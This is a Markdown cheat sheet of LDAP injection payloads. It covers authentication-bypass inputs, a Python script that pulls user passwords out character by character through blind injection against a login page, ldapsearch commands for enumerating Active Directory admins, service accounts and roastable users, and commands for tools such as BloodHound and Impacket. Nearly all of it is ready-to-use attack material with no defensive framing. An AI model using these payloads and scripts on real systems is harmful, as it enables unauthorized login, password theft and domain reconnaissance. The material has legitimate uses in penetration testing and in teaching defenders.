# LDAP Injection Payloads

## Authentication Bypass

```
# Standard LDAP auth filter: (&(uid=USER)(userPassword=PASS))

# Bypass with wildcard
Username: *
Password: * (or anything)
# → (&(uid=*)(userPassword=*)) → matches all users

# Bypass with closing parenthesis
Username: admin)(&)
Password: anything
# → (&(uid=admin)(&))(userPassword=anything)) → always true

# Bypass with null injection
Username: admin%00
Password: anything
# → (&(uid=admin\00)(userPassword=anything)) → ignores password

# OR injection
Username: admin)(|(uid=*
Password: anything
# → (&(uid=admin)(|(uid=*)(userPassword=anything))) → matches admin
```

## Data Extraction

### Boolean-Based Blind
```python
import requests
import string

URL = "http://TARGET/login"
TRUE_INDICATOR = "Welcome"

def check(query):
    r = requests.post(URL, data={"user": query, "pass": "anything"})
    return TRUE_INDICATOR in r.text

# Extract attribute value character by character
def extract_attr(attr, known=""):
    charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*"
    for c in charset:
        payload = f"admin)({attr}={known}{c}*"
        if check(payload):
            return known + c
    return known  # end of string

# Extract password
password = ""
for _ in range(50):
    new = extract_attr("userPassword", password)
    if new == password:
        break
    password = new
    print(f"[+] {password}")
```

### Wildcard Enumeration
```
# Test if attribute exists
admin)(uid=*          → true if uid attribute exists
admin)(mail=*         → true if mail attribute exists
admin)(description=*  → true if description attribute exists

# Enumerate attribute values
admin)(mail=a*        → does mail start with 'a'?
admin)(mail=b*        → does mail start with 'b'?
# ... binary search through alphabet

# Common LDAP attributes to extract:
# uid, cn, sn, mail, userPassword, description, telephoneNumber
# memberOf, objectClass, distinguishedName, sAMAccountName
```

## Active Directory LDAP Enumeration

```bash
# Anonymous bind (if allowed)
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=com" -s sub "(objectClass=*)"

# With credentials
ldapsearch -x -H ldap://TARGET -D "CN=user,DC=domain,DC=com" -w password -b "dc=domain,dc=com"

# Enumerate users
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=com" "(objectClass=person)" sAMAccountName

# Enumerate groups
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=com" "(objectClass=group)" cn member

# Find domain admins
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=com" "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)" sAMAccountName

# Find computers
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=com" "(objectClass=computer)" cn operatingSystem

# Service accounts (Kerberoastable)
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Users with no pre-auth (AS-REP roastable)
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

## LDAP Filter Syntax

```
# Equality:    (attribute=value)
# Wildcard:    (attribute=val*)
# Presence:    (attribute=*)
# AND:         (&(cond1)(cond2))
# OR:          (|(cond1)(cond2))
# NOT:         (!(condition))
# Greater:     (attribute>=value)
# Less:        (attribute<=value)
# Approx:      (attribute~=value)

# Bitwise (AD specific):
# (userAccountControl:1.2.840.113556.1.4.803:=2)    → disabled accounts
# (userAccountControl:1.2.840.113556.1.4.803:=65536) → password never expires

# Escaped characters:
# * → \2a
# ( → \28
# ) → \29
# \ → \5c
# NULL → \00
```

## Tools

```bash
# ldapdomaindump (AD enumeration)
ldapdomaindump -u 'DOMAIN\user' -p password TARGET

# Bloodhound (AD attack path analysis)
bloodhound-python -d domain.com -u user -p password -ns TARGET -c all

# Impacket GetADUsers
GetADUsers.py -all domain.com/user:password -dc-ip TARGET
```
